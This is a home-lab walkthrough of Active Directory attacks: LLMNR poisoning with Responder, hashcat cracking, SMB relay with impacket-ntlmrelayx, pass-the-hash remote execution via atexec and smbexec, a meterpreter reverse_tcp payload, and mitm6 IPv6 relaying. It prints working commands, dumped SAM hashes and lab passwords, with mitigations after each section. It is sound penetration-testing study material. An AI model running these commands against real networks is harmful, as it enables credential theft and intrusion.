Setup win2022 server: 192.168.64.138   
Setup Peterparker: \\192.168.64.140  
Setup Frankcastle: 192.168.64.139  
Kali: \\192.168.64.129/24

## 🚩 LLMNR Poisoning - Link Local Multicast resolution

**Requirements:**  
* LLMNR attack can be performed if the LLMNR/NBT-NS is enabled and the attacker machine is in the same network as the target.
* LLMNR attacks use the Responder tool which captures credentials that are broadcasted over the network when a user seek connection to a another service / resource that does not exists or is poorly configured. Through these vulnerabilities, Responder spoofs the request and responds by stating they know the service or resource. Requesting the victims NTLM hash.  

![image](https://github.com/user-attachments/assets/fc6902c4-acf7-4787-b2c8-607a7cd2900b)  

Commonly used tooling for LLMNR Poisoning attacks:  
Responder, Impacket, MITM6

### Capturing Hashes with Responder

Kali responder IP: 192.168.64.129/24

            sudo responder -I eth0 -dwv

![image](https://github.com/user-attachments/assets/8de5ddb4-8956-4b4b-98f6-c2df1cb6ac99)  

Ensure details such as nic, responder ip, is all correct. Once responder is on the network and listening for traffic, an example of captured NTLMv2 hashes can be seen like this:

![image](https://github.com/user-attachments/assets/f4e41ca4-5d90-4b66-b181-399742def06f)

### Cracking NTLM hashes  

            root@kali:/home/kali# hashcat -m 5600 ntlm.txt /usr/share/wordlists/rockyou.txt --force

![image](https://github.com/user-attachments/assets/7d5a47ce-1ef8-4cb6-9e7d-b8785a930da5)

Hash cracked.

## 🔵 LLMNR Poisoning Mitigation  

1. Disable LLMNR / NBT-NS (NetBIOS) Broadcasts.  
2. Implement NAC on the internal network.
3. Have strong password requirements for end users espicially admin or service accounts. This will also add to defense in depth.

## 🚩SMB Relay Attack - Service Message Block

SMB (Server Message Block) is a protocol used for file shares, printers, and other resources on a network. This common protocol can be abused when an attacker on the same internal network (domain and or subdomain) is actively attempting to capture the NTLM hashes transmitted over the network. Which is then maliciously relayed to a service / server, granting access since the hash is authenticated.

**Requirements:**  
* SMB signing must be disabled or not enforced on the target machine.  
* Target machine should be admin, domain admin or service accounts for maximum effect.
* Responder config files /etc/responsder/Responder.conf must have smb and https turned off, so that captured hashes are not stored but are instead 'relayed'.

![image](https://github.com/user-attachments/assets/d8f8f9fc-6393-4e74-877a-9a0a0731cc97)  

🔴 The reason why these are turned off is to prevent the authentication resposne from being captured, but rather we are attempting to 'relay' them to our targets lists.


1. Firstly identify hosts without SMB signing. 

            nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn 
      
![image](https://github.com/user-attachments/assets/52f6904d-f256-467c-9b40-414b011f57c2)

2. Once we have discovered our targets (have SMB signing disabled and not required). Create a targets.txt detailing the targets.

            nano target.txt > add target ips into file

3. Start responsder with the new edited config files.

            responder -I eth0 -dPv

5. Start ntlmrelayx.py or impacket-ntlmrelax.

            impacket-ntlmrelax -tf targets.txt -smb2support

![image](https://github.com/user-attachments/assets/ac597d69-e6d9-4da3-affa-ca352ce13850)  

            [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2709e4a8da75eb3a5c72700995058b08:::
            peterparker:1001:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
            [*] Done dumping SAM hashes for host: 192.168.64.140
            [*] Stopping service RemoteRegistry
            [*] Restoring the disabled state for service RemoteRegistry
Above figure presents a SAM Dump  

We have succesfully captured the NTLM hash from peterparker with Responder relaying the SAM authentication back to the server using impacket-ntlmrelayx. 

6. Gaining interactive shell with impacket.

            impacket-ntlmrelayx -tf targets.txt -smb2support -i  

![image](https://github.com/user-attachments/assets/dff22fbf-f7e3-4415-bb76-c1f9a7c42541)

Once interactive shell has been obtained as seen above, we can now bind this with netcat via the SMB shell TCP on 127.0.0.1:11000  
Once netcat has been binded to list all the available arguments that is available to be used in this specific shell environment.  

![image](https://github.com/user-attachments/assets/5ea73547-920d-4d1d-8ce7-085dadedbfc1)

7. Using command switch with impacket. 

            impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

![image](https://github.com/user-attachments/assets/0bda36ba-980a-444a-ad6d-de4fa828981a)  

SMB relay attack with -c 'whoami' flag successful

## 🔵 SMB Relay attack Mitigations

1. Enable SMB Signing on all devices.
2. Accounting Tiering (limiting specific accounts to defined tasks).
3. Local admin restriction.
4. Disable NTLM authentication (completely stops the attack however if Kerberos fails, it cannot default to NTLM authentication).

## 🚩 Gaining Shell Access

### 🔴 Metasploit module using psexec  
In metasploit we have chosen the windows/smb/psexec module  
![image](https://github.com/user-attachments/assets/5a95bb0b-2ef1-4559-9047-239d20571096)  

and set payload to x64 compatible as most* modern machines run x64.

            set payload windows/x64/meterpreter/reverse_tcp

configure the options with the information gathered in the LLMNR attack.

![image](https://github.com/user-attachments/assets/24e94831-edbe-47ec-b388-2287fe5ac5ba)

After trying to run, the exploit was suggested to be succesful however no session was created.  
Tried to debug this issue by setting payload to non x64 version, setting exploit targets to different settings, changing LPORT to 5555, setting up metasploit multi handler for connections and also nc -nlvp 4444. With no success.

![image](https://github.com/user-attachments/assets/e0567cb8-f6f3-4060-bcb4-81e7ad6cf4b6)  

Not a big deal... we can try to manually exploit it via a hash attack... (My preferred way anyways ;]) 

### 🔴 Manual mode using psexec.py / wmiexec / atexec 
Using impacket-psexec there seems to be a failure in popping a shell when using psexec.
![image](https://github.com/user-attachments/assets/b241e679-e193-444a-b7ef-4ff5e68e1a43)

attempted to use wmiexec instead, with no success. However after some trial and error atexec seemed like the one to go with. Unsure as to the reason why this one worked, but there seems to be some research suggesting the prior ones may be mitigated by Defender.  

👍Using atexec with domain/user and password

            impacket-atexec MARVEL/fcastle:'Password1'@192.168.64.139 "whoami"
![image](https://github.com/user-attachments/assets/3bdef2d4-e172-4b36-aaa0-c0927494f0d8)  

👍Using atexec with administrator and hash

            impacket-atexec administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc "whoami"
![image](https://github.com/user-attachments/assets/36981884-3a94-4d8e-a8e9-d0c4508988ed)

👍Using smbexec with domain/user and password

            impacket-smbexec MARVEL/fcastle:Password1@192.168.64.139  
![image](https://github.com/user-attachments/assets/3852e0ef-d03a-4df7-a508-aed4d5e33ff3)

👍Using smbexec with administrator and hash

            /home/kali# impacket-smbexec administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc
![image](https://github.com/user-attachments/assets/6d13d42c-9e78-472c-8164-52fe8f118a14)

### 🟣 Findings  
After some trial and error, not all 'execs' will work and this is normal in the real world. Through trial and error in this case the two that was discovered to work for both 'domain/user + password' and 'administrator + password' was **impackets**:
* atexec
* smbexec

### Other Remote command execution tools in Windows environments to attempt if one does not work.

1. Psexec
2. Wmiexec
3. SMBexec
4. Atexec

## 🚩 IPv6 Attacks - Another form of relaying.  
IPv6 can be used to conduct authentication via DNS to the Domain Controller via LDAP or SMB.  

To identify if IPv6 exsists on a network or endpoint the following nmap command can be used:  
**General Discovery** 
                        
            nmap -6 -sn <IPv6_range>

**Once you find active hosts, scan for attack vectors using:**

            nmap -6 -p- <IPv6_target>

1.  We will use ntlmrelayx here with ipv6 -6 and the target -t pointing to ldaps of the DC. -wh (wpad) -l (gathered information)  

            impacket-ntlmrelayx -6 -t ldaps://192.168.64.138 -wh fakepad.marvel.local -l lootme  
            
2. Using mitm6 we set the domain -d to marvel.local. By using mitm6 we are essentially placing us in the middle to intercept and relay ipv6 authentications.  

            mitm6 -d marvel.local

![image](https://github.com/user-attachments/assets/a785249c-7700-46d4-b754-ab65689239ec)

3. Now as we sit in the network we can already see traffic being captured across the network. In the ntlmrelayx instance, we can see succesfull relays from MARVEL/THEPUNISHER.

![image](https://github.com/user-attachments/assets/74060f44-2d49-46cf-a4a6-6058d8342c39)

4. Domain info has now been dumped to the lootme file, which contains a plethora of information.

![image](https://github.com/user-attachments/assets/584e547f-d928-4c74-b2c3-9f50e1b40add)

5. As we continue to sit in the network with mitm6 running, we will eventually capture log in events. In this case, we will generate a login with MARVEL\administrator on THEPUNISHER machine. And we eventually capture this event in addition it has generated a new account and password for us, allowing us to proceed with DCSYNC attack with secretsdump.py later.

![image](https://github.com/user-attachments/assets/db4f9e93-0527-4c16-92b9-65dc4d3a776b)

## 🔵 IPv6 Mitigations  

1. If the network does not require the usage of IPv6 then proceed to blocking DHCPv6 traffic however this may have side affects.
2. Disable WPAD if not used entirely.
3. Relaying LDAP and LDAPS can be mitigated by enabling both LDAP signing and LDAP channel binding.
4. Consider addingAdministrative users to the Protected Users Group or marking them as Account is sensitive and cannot be delegated, preventing impoersonation attacks.

------- 
**Reference:**  

https://medium.com/@tayyabanoor1201/tcm-security-smb-relay-attack-writeup-dfc7cc113bb0

https://medium.com/@rymak/smb-relay-attack-19192e1d158c

🥇https://ct-cyber.me/smb-relay-to-reverse-shells-initial-attack-vector-evading-av-bb8010097571
